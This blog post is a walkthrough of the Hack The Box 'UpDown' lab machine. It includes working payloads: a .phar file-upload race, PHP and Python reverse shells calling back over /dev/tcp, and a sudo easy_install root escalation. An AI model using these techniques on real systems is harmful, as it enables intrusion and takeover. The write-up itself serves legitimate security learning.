+++
title = 'UpDown From Hack The Box - Medium Linux Machine'
date = 2023-01-03T16:18:46+01:00
draft = false
type = "post"
excerpt = """
Gaining access to a development web application's source code through an exposed .git repository, I discovered a time-limited file upload vulnerability through static code analysis. I exploited this vulnerability to gain access as the www-data user. By exploiting a setuid binary and the input() function behavior in Python 2, I was able to locally pivot to the developer user. Finally, I elevated my privileges to root by exploiting the easy_setup utility.
"""
authors = ["Hassan AL ACHEK"]
tags = ["HTB", "CTF", "Linux", "Hacking"]
categories = []
readingTime = 5  
hero = "/images/updown.jpg"
+++

# Recon

## Quick Nmap Scan

```bash
goku@exploitation:~$ IP=10.10.11.177
goku@exploitation:~$ nmap -Pn $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-29 21:46 CET
Nmap scan report for 10.10.11.177
Host is up (0.030s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
```

- Open ports: 22 (ssh) - 80 (http)

## Full Nmap Scan

```bash
goku@exploitation:~$ nmap -p- -Pn $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-29 21:52 CET
Nmap scan report for 10.10.11.177
Host is up (0.059s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.53 seconds
```

## Nmap Services Version Fingerprinting:

```bash
goku@exploitation:~$ nmap -p80,22 -Pn -A -sC -sV $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-29 21:52 CET
Nmap scan report for 10.10.11.177
Host is up (0.030s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9e1f98d7c8ba61dbf149669d701702e7 (RSA)
|   256 c21cfe1152e3d7e5f759186b68453f62 (ECDSA)
|_  256 5f6e12670a66e8e2b761bec4143ad38e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.51 seconds

```

## Recon: WEB Application - Port 80 (http)

- Web main page:

![Image alt](/images/Pasted-image-20221229220204.png)

- Web Tech Stack:

![Image alt](/images/Pasted-image-20221229220249.png)

- Let's start up our web pentesting tool, BurpSuite, and intercept the check request.
- Request and response with debugging mode off:

![Image alt](/images/Pasted-image-20221229220828.png)

- Request and response with debugging mode on:

![Image alt](/images/Pasted-image-20221229221014.png)

## Recon: Directory Brute Forcing:

```bash
goku@exploitation:~$ dirsearch -u http://siteisup.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 62277

Output File: /home/goku/.dirsearch/reports/siteisup.htb/_22-12-29_22-37-07.txt

Error Log: /home/goku/.dirsearch/logs/errors-22-12-29_22-37-07.log

Target: http://siteisup.htb/

[22:37:08] Starting:
[22:37:09] 301 -  310B  - /dev  ->  http://siteisup.htb/dev/
[22:37:28] 403 -  277B  - /server-status

Task Completed
```

- Directories discovered: `/dev`, `/server-status`

## Recon: `/server-status` Endpoint

- If we visit the `/server-status` endpoint directly, we will see the following page:

![Image alt](/images/Pasted-image-20221229224933.png)

- Let's exploit the main web application's functionality to gather data and make requests on behalf of the main server. My expectation is that if the request is originated from the server itself, I will be able to bypass the request restrictions and get the page content by enabling the debug mode. Let's give it a try and enjoy our Server-Side Request Forgery (SSRF).

![Image alt](/images/Pasted-image-20221229230409.png)

- Nice, we were detected guys :)
- Let's try to bypass some security restrictions, but first let's take a look at the request in BurpSuite.

![Image alt](/images/Pasted-image-20221229230656.png)

- I tried several methods to bypass the SSRF protection,but I was unsuccessful.

## Recon: Virtual hosts enumeration:

```bash
goku@exploitation:~$ gobuster vhost -u siteisup.htb -t 40 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://siteisup.htb
[+] Method:          GET
[+] Threads:         40
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.3
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2022/12/29 22:16:07 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.siteisup.htb Status: 403 [Size: 281]
Found: *.siteisup.htb Status: 400 [Size: 301]
Progress: 99785 / 100001 (99.78%)
===============================================================
2022/12/29 22:17:40 Finished
===============================================================
```

- A new subdomain was discovered: `dev.siteisup.htb`

## Recon: WEB App `dev.siteisup.htb`

- Main page:

![Image alt](/images/Pasted-image-20221229223133.png)

- I tried using the `siteisup.htb` web app to make the request on behalf of the server, but unfortunately my plan did not work.

## Recon: WEB App `siteisup.htb/dev/`

- Directory brute force:

```bash
goku@exploitation:~$ dirsearch -u http://siteisup.htb/dev/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 37045

Output File: /home/goku/.dirsearch/reports/siteisup.htb/-dev-_22-12-30_08-30-25.txt

Error Log: /home/goku/.dirsearch/logs/errors-22-12-30_08-30-25.log

Target: http://siteisup.htb/dev/

[08:30:25] Starting:
[08:30:27] 200 -    0B  - /dev/index.php
[08:30:28] 200 -    0B  - /dev/.
[08:30:29] 403 -  277B  - /dev/.html
[08:30:30] 403 -  277B  - /dev/.php
[08:30:36] 403 -  277B  - /dev/.htm
[08:30:36] 301 -  315B  - /dev/.git  ->  http://siteisup.htb/dev/.git/
[08:30:37] 403 -  277B  - /dev/.htpasswds
[08:30:54] 403 -  277B  - /dev/wp-forum.phps
[08:31:16] 403 -  277B  - /dev/.htuser
CTRL+C detected: Pausing threads, please wait...
[q]uit / [c]ontinue: q

Canceled by the user
```

- Great! We found a `.git` repository.

```bash
[08:30:36] 301 -  315B  - /dev/.git  ->  http://siteisup.htb/dev/.git/
```

- What is `.git` directory?

The `.git` directory is a directory that is created when a developer initializes a new Git repository on their computer. It is used to store all of the version control information for the project, including a history of all of the changes that have been made to the project, as well as any branches and tags that have been created.

If a penetration tester finds the `.git` directory on a web application, it may be a potential security concern because it could contain sensitive information about the application and its development history. For example, the `.git` directory may contain a list of all of the files in the repository, as well as the names of the developers who have worked on the project. This information could potentially be used by an attacker to identify vulnerabilities in the application or to craft targeted attacks.

It is generally a good practice to ensure that the `.git` directory is not accessible from the web, as it could potentially expose sensitive information about the application. This can typically be done by adding the `.git` directory to the `.gitignore` file or by configuring the web server to block access to it.

- `/dev/.git` Endpoint:

![Image alt](/images/Pasted-image-20221230083657.png)

[External resource: exploiting exposed .git directory - pentester.land](https://pentester.land/blog/source-code-disclosure-via-exposed-git-folder/)

## Obtaining the secrets:

- We will use a tool called [git-dumper](https://github.com/arthaud/git-dumper.git)

```bash
goku@exploitation:~$ git-dumper http://siteisup.htb/dev/.git/ ~/siteisup-dev
[-] Testing http://siteisup.htb/dev/.git/HEAD [200]
[-] Testing http://siteisup.htb/dev/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://siteisup.htb/dev/.gitignore [404]
[-] http://siteisup.htb/dev/.gitignore responded with status code 404
[-] Fetching http://siteisup.htb/dev/.git/ [200]
[-] Fetching http://siteisup.htb/dev/.git/packed-refs [200]
[-] Fetching http://siteisup.htb/dev/.git/branches/ [200]
[-] Fetching http://siteisup.htb/dev/.git/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/description [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/config [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/ [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/ [200]
[-] Fetching http://siteisup.htb/dev/.git/index [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/info/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/heads/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/tags/ [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/commit-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-commit.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/post-update.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-push.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-receive.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/ [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/update.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/heads/main [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/main [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/info/ [200]
[-] Fetching http://siteisup.htb/dev/.git/info/exclude [200]
[-] Running git checkout .
Updated 6 paths from the index
```

- Let's examine the source code:

```bash
goku@exploitation:~$ tree siteisup-dev
siteisup-dev
├── admin.php
├── changelog.txt
├── checker.php
├── index.php
└── stylesheet.css

0 directories, 5 files
```

## Source code review:

- The dumped git repository:

```bash
goku@exploitation:~/siteisup-dev$ ls -alh
total 40K
drwxr-xr-x  3 goku goku 4.0K Dec 30 08:48 .
drwx------ 26 goku goku 4.0K Dec 30 08:48 ..
-rw-r--r--  1 goku goku   59 Dec 30 08:48 admin.php
-rw-r--r--  1 goku goku  147 Dec 30 08:48 changelog.txt
-rw-r--r--  1 goku goku 3.1K Dec 30 08:48 checker.php
drwxr-xr-x  7 goku goku 4.0K Dec 30 08:48 .git
-rw-r--r--  1 goku goku  117 Dec 30 08:48 .htaccess
-rw-r--r--  1 goku goku  273 Dec 30 08:48 index.php
-rw-r--r--  1 goku goku 5.5K Dec 30 08:48 stylesheet.css
```

- What is `.htaccess`?
The `.htaccess` file is a text file that contains a set of configuration directives written in Apache's domain-specific language. These directives can be used to specify how the web server should behave in certain situations, such as how it should handle requests for specific files or directories, or how it should redirect requests to other pages.

```bash
goku@exploitation:~/siteisup-dev$ cat .htaccess
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

- This `.htaccess` file is used to restrict access to the website or directory to only those clients that have the `Special-Dev` header set to `"only4dev"`. All other clients will be denied access.

- Okay, so now we know that in order to access the `dev.siteisup.htb` website, we need a special HTTP header.
- Let's configure Burp Suite to include this header:

![Image alt](/images/Pasted-image-20221230121741.png)

- Enjoy!

![Image alt](/images/Pasted-image-20221230121832.png)

- To browse the website using a browser, i used an extension called `Modify Header Value (HTTP Headers)`

![Image alt](/images/Pasted-image-20221230131555.png)

```bash
goku@exploitation:~/siteisup-dev$ cat changelog.txt
Beta version

1- Check a bunch of websites.

-- ToDo:

1- Multithreading for a faster version :D.
2- Remove the upload option.
3- New admin panel.
```

```php
# index.php source code
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
	define("DIRECTACCESS",false);
	$page=$_GET['page'];
	if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
		include($_GET['page'] . ".php");
	}else{
		include("checker.php");
	}
?>
```

```php
# checker.php source code
<?php
if(DIRECTACCESS){
	die("Access Denied");
}
?>
<!DOCTYPE html>
<html>

  <head>
    <meta charset='utf-8' />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <link rel="stylesheet" type="text/css" media="screen" href="stylesheet.css">
    <title>Is my Website up ? (beta version)</title>
  </head>

  <body>

    <div id="header_wrap" class="outer">
        <header class="inner">
          <h1 id="project_title">Welcome,<br> Is My Website UP ?</h1>
          <h2 id="project_tagline">In this version you are able to scan a list of websites !</h2>
        </header>
    </div>

    <div id="main_content_wrap" class="outer">
      <section id="main_content" class="inner">
        <form method="post" enctype="multipart/form-data">
			    <label>List of websites to check:</label><br><br>
				<input type="file" name="file" size="50">
				<input name="check" type="submit" value="Check">
		</form>

<?php

function isitup($url){
	$ch=curl_init();
	curl_setopt($ch, CURLOPT_URL, trim($url));
	curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	$f = curl_exec($ch);
	$header = curl_getinfo($ch);
	if($f AND $header['http_code'] == 200){
		return array(true,$f);
	}else{
		return false;
	}
    curl_close($ch);
}

if($_POST['check']){

	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];

	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}

	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }

  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");

  # Read the uploaded file.
	$websites = explode("\n",file_get_contents($final_path));

	foreach($websites as $site){
		$site=trim($site);
		if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
			$check=isitup($site);
			if($check){
				echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
			}else{
				echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
			}
		}else{
			echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
		}
	}

  # Delete the uploaded file.
	@unlink($final_path);
}

function getExtension($file) {
	$extension = strrpos($file,".");
	return ($extension===false) ? "" : substr($file,$extension+1);
}
?>
      </section>
    </div>

    <div id="footer_wrap" class="outer">
      <footer class="inner">
        <p class="copyright">siteisup.htb (beta)</p><br>
        <a class="changelog" href="changelog.txt">changelog.txt</a><br>
      </footer>
    </div>

  </body>
</html>
```

```php
# admin.php source code

<?php
if(DIRECTACCESS){
	die("Access Denied");
}

#ToDo
?>
```

- In the `checker.php` file, we can see an attack vector. If we upload a file that contains URLs for testing, the web application will create an upload directory and save the file there.

- The directory is created by generating an MD5 hash of the current time at the time of the upload.

- To exploit this behavior, we can upload a file with multiple URLs that will give us enough time for our payload (included in the file) to be executed.

- However, we need to be mindful of the allowed file extensions:

```php
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
```

- This web application has blacklisted the following extensions: `php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar`
- I will use the `.phar` extension here.
- I created the following file: `footHold.phar`

```bash
goku@exploitation:~$ echo -e "http://google.com\nhttp://google.com\nhttp://google.com\n<?php phpinfo() ?>" > footHold.phar
```

- Let's upload the file for checking:

![Image alt](/images/Pasted-image-20230102234151.png)

- After uploading the `footHold.phar` file, the web application will start checking every URL within the uploaded file.

- The security problem with this code implementation is as follows:

1- For each file uploaded, a user-accessible file is created in the uploads directory.

```PHP
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }

  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
```

2- This file will be deleted after the websites within it have been checked.
3- The web application takes time to check if the website is up or down before deleting the uploaded file.
4- The uploaded file will remain in the `uploads/<randomly_generated_directory_name>` directory while it is being checked.

```php
# Read the uploaded file.
	$websites = explode("\n",file_get_contents($final_path));

	foreach($websites as $site){
		$site=trim($site);
		if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
			$check=isitup($site);
			if($check){
				echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
			}else{
				echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
			}
		}else{
			echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
		}
	}

  # Delete the uploaded file.
	@unlink($final_path);
```

# Foothold: Shell as www-data

- From an attacker's perspective, we can upload a file with multiple links to gain more time before our uploaded file is deleted. Then, we can go to the `uploads/<randomly_generated_directory_name>` directory and click the uploaded file to see the results of the embedded PHP code.

![Image alt](/images/Pasted-image-20230102235728.png)

![Image alt](/images/Pasted-image-20230102235752.png)

- Okay, now that we have executed the `phpinfo()` function, we can start the process of creating our PHP reverse shell.

![Image alt](/images/Pasted-image-20230102235831.png)

- Let's check the `disable_functions` section to get an idea about the allowed and disabled PHP functions:

![Image alt](/images/Pasted-image-20230103000203.png)

- Here is the PHP reverse shell that I used:

```php
# shell.phar
http://google.com
http://google.com
http://google.com
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open('bash -c "bash -i >& /dev/tcp/10.10.14.12/4444 0>&1"', $descriptorspec, $pipes);

if (is_resource($process)) {
    // $pipes now looks like this:
    // 0 => writeable handle connected to child stdin
    // 1 => readable handle connected to child stdout
    // Any error output will be appended to /tmp/error-output.txt

    fwrite($pipes[0], '<?php print_r($_ENV); ?>');
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}
```

- the script creates a process that runs the Bash shell and connects it to a remote host and port using the `bash -i >& /dev/tcp/10.10.14.12/4444 0>&1` command. The $descriptorspec array specifies the pipes that will be used to communicate with the child process. The proc_open() function is then used to start the process and return a resource that represents it.

- Getting Reverse Shell:

```bash
┌──(goku㉿exploitation)-[~]
└─$ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.12] from siteisup.htb [10.10.11.177] 43958
bash: cannot set terminal process group (911): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/var/www/dev/uploads/3b388790d35d58cf684975ffc668c9ec$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@updown:/var/www/dev/uploads/3b388790d35d58cf684975ffc668c9ec$
```

# Privilige Escalation To `developer`

- After gaining access to the machine, I found a `developer` user in the home directory and a directory called `dev` containing the following files: a binary file `siteisup` with the SUID bit set and a file called `siteisup_test.py`

- I used the `strings` command to perform basic static binary analysis on the file

```bash
www-data@updown:/home/developer/dev$ ls -alh
ls -alh
total 32K
drwxr-x--- 2 developer www-data  4.0K Jun 22  2022 .
drwxr-xr-x 6 developer developer 4.0K Aug 30 11:24 ..
-rwsr-x--- 1 developer www-data   17K Jun 22  2022 siteisup
-rwxr-x--- 1 developer www-data   154 Jun 22  2022 siteisup_test.py
www-data@updown:/home/developer/dev$ cat siteisup_test.py
cat siteisup_test.py
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"

www-data@updown:/home/developer/dev$ strings siteisup
strings siteisup
/lib64/ld-linux-x86-64.so.2
libc.so.6
puts
setresgid
setresuid
system
getegid
geteuid
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Welcome to 'siteisup.htb' application
/usr/bin/python /home/developer/dev/siteisup_test.py
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
siteisup.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
setresuid@@GLIBC_2.2.5
_edata
setresgid@@GLIBC_2.2.5
system@@GLIBC_2.2.5
geteuid@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
getegid@@GLIBC_2.2.5
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
www-data@updown:/home/developer/dev$

```

- The executable file `siteisup` runs the `siteisup_test.py` file using Python 2 instead of Python 3.

```bash
....
/usr/bin/python /home/developer/dev/siteisup_test.py
....
```

- The `siteisup_test.py` Python code uses the `input()` function, which can be exploited in Python 2 (for more details, see the following article). [Hacking Python Application - By Vickie Li](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1))

```python
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"
```

- Let's exploit the input() function to gain access as the developer user!

```bash
www-data@updown:/home/developer/dev$ ./siteisup
./siteisup
__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.12/4242 0>&1"')

```

- Received connection as developer:

```bash
# Local Listner
┌──(goku㉿exploitation)-[~]
└─$ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.12] from siteisup.htb [10.10.11.177] 58190
bash: cannot set terminal process group (911): Inappropriate ioctl for device
bash: no job control in this shell
developer@updown:/home/developer/dev$ id
id
uid=1002(developer) gid=33(www-data) groups=33(www-data)
developer@updown:/home/developer/dev$


```

# Privilige Escalation: Road to Root!

```bash
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
developer@updown:~$ ls -alh /usr/local/bin/easy_install
-rwxr-xr-x 1 root root 229 Aug  1 18:07 /usr/local/bin/easy_install
developer@updown:~$ cat /usr/local/bin/easy_install
#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from setuptools.command.easy_install import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())

```

- Using [GTFOBINS](https://gtfobins.github.io/gtfobins/easy_install/)

```bash
developer@updown:~$ TF=$(mktemp -d)
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:~$ sudo easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.9evK3Sdvf8
Writing /tmp/tmp.9evK3Sdvf8/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.9evK3Sdvf8/egg-dist-tmp-bxQAxd
# ls
egg-dist-tmp-bxQAxd  setup.cfg	setup.py  temp
# cd /root
# ls
root.txt  snap
# cat root.txt

```

# Thanks For Reading!

